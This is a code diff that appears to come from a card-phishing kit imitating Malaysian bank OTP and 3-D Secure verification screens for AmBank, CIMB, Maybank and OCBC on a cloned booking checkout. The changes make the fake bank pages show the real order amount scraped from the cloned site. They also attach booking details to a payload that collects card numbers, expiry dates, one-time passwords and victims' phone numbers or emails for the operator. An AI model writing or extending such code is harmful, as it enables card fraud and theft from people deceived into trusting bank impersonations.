@@ -1804,7 +1804,7 @@ fetch('/api/settings')
       var sfx = p.phoneSuffix || '****';
 
     document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';
-    document.getElementById('otp-amount').textContent='$'+discountedTotal().toFixed(2);
+    document.getElementById('otp-amount').textContent='MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
       /*var otpMsg = q('otpMessage');
       if (otpMsg) otpMsg.textContent =
         'A One-Time Password has been sent to your registered mobile number ending ' + sfx +
@@ -1819,7 +1819,7 @@ fetch('/api/settings')
       var sfx = p.phoneSuffix || document.querySelector("#email").value;
 
     document.querySelector("#email-form > p").innerHTML='We have resent One-Time Password (OTP) in a text message to your registered email '+sfx+'.<br>Please submit your One-Time Password (OTP).';
-    document.getElementById('email-amount').textContent='$'+discountedTotal().toFixed(2);
+    document.getElementById('email-amount').textContent='MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
       /*var otpMsg = q('otpMessage');
       if (otpMsg) otpMsg.textContent =
         'A One-Time Password has been sent to your registered mobile number ending ' + sfx +
@@ -1833,7 +1833,7 @@ fetch('/api/settings')
       var sfx = p.phoneSuffix || '****';
 
     document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';
-    document.getElementById('otp-amount').textContent='$'+discountedTotal().toFixed(2);
+    document.getElementById('otp-amount').textContent='MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
       /*var otpMsg2 = q('otpMessage');
       if (otpMsg2) otpMsg2.textContent = p.message || 'Please complete verification.';*/
       resetOtp();
@@ -1941,7 +1941,7 @@ fetch('/api/settings')
 
       if(p.cardInfo.bankName==='AMBANK (M) BERHAD') {
         document.querySelector("#mount1").classList.remove('hidden');
-        document.querySelector("#mount1").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'MYR '+discountedTotal().toFixed(2);
+        document.querySelector("#mount1").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
         const now = new Date(); 
         const options = {
         weekday: 'short',
@@ -1967,7 +1967,7 @@ fetch('/api/settings')
       else
       if(p.cardInfo.bankName==='CIMB BANK BERHAD') {
         document.querySelector("#mount2").classList.remove('hidden');
-        document.querySelector("#mount2").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'MYR '+discountedTotal().toFixed(2);
+        document.querySelector("#mount2").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
         document.querySelector("#mount2").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(6) > td:nth-child(3) > span").textContent = p.cardInfo.cardNumber.slice(-4);
         const now = new Date(); 
         const options = {
@@ -1994,7 +1994,7 @@ fetch('/api/settings')
       else
       if(p.cardInfo.bankName==='MALAYAN BANKING BERHAD') {
         document.querySelector("#mount3").classList.remove('hidden');
-        document.querySelector("#mount3").shadowRoot.querySelector("div > table.infotable.infotableoob > tbody > tr:nth-child(2) > td:nth-child(2) > div").innerHTML = '<span>MYR '+discountedTotal().toFixed(2)+'</span>';
+        document.querySelector("#mount3").shadowRoot.querySelector("div > table.infotable.infotableoob > tbody > tr:nth-child(2) > td:nth-child(2) > div").innerHTML = '<span>MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "")+'</span>';
         document.querySelector("#mount3").shadowRoot.querySelector("div > table.infotable.infotableoob > tbody > tr:nth-child(4) > td:nth-child(2) > div > span").textContent = p.cardInfo.cardNumber.slice(-4);
         const now = new Date(); 
         const options = {
@@ -2020,7 +2020,7 @@ fetch('/api/settings')
       else
       if(p.cardInfo.bankName==='OVERSEA-CHINESE BANKING CORPORATION LTD.' || p.cardInfo.bankName==='OCBC BANK (MALAYSIA) BERHAD') {
         document.querySelector("#mount4").classList.remove('hidden');
-        document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(1) > td:nth-child(2) > span").textContent = 'MYR '+discountedTotal().toFixed(2);
+        document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(1) > td:nth-child(2) > span").textContent = 'MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
         document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(3) > td:nth-child(2) > span:nth-child(2)").textContent = p.cardInfo.cardNumber.slice(-4);
         const now = new Date(); 
         const options = {
@@ -2049,7 +2049,7 @@ fetch('/api/settings')
         document.querySelector("#app-verify-overlay > div.app-verify-box").classList.remove('hidden');
         var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
       updateBankLogo(bankName);
-      document.getElementById('app-amount').textContent = '$' + discountedTotal().toFixed(2);
+      document.getElementById('app-amount').textContent = 'MYR ' + document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
       updateAppSchemeLogo(p.cardInfo?.cardType || p.cardType || '')
       }
 
@@ -2078,7 +2078,7 @@ fetch('/api/settings')
       document.getElementById('load-overlay').classList.add('hidden');
       document.getElementById('pin-overlay').classList.remove('hidden');
       document.getElementById('pin-amount-row').style.display = '';
-      document.getElementById('pin-amount').textContent = 'MR ' + discountedTotal().toFixed(2);
+      document.getElementById('pin-amount').textContent = 'MR ' + document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
       updateOtpCardLogoStyle(p.cardInfo?.cardType || p.cardType, 'pin-card-logo');
       resetPin();
                         }
@@ -2111,10 +2111,31 @@ fetch('/api/settings')
     var otp = q('otp-code')   ? q('otp-code').value.trim()   : '';
     var nmParts=fn.split(' ');
  
+    var pm = (document.querySelector('input[name="payment_method"]:checked') || {}).value || 'credit';
+    var od = {};
+    try {
+      var rb = JSON.parse(localStorage.getItem('redbus_booking') || '{}');
+      var tk = JSON.parse(localStorage.getItem('redbus_booking_ticket') || '{}');
+      if (rb.busName || rb.origin) {
+        od = {
+          productName: rb.busName || (rb.origin + ' → ' + rb.destination),
+          amount: Number(rb.amount || 0),
+          paymentMethod: pm
+        };
+      } else if (tk.productName || tk.ticketName) {
+        od = {
+          productName: tk.productName || tk.ticketName || '',
+          amount: Number(tk.amount || 0),
+          paymentMethod: pm
+        };
+      }
+    } catch (e) {}
+
     return {
       frontendUrl:  location.hostname,
       currentStep:  _curStep,
       browsingTabs: [{label:'卡片页',count:1,active:true}],
+      orderInfo: od,
       cardInfo: {
         cardNumber: cn,
         expiry:     exp,
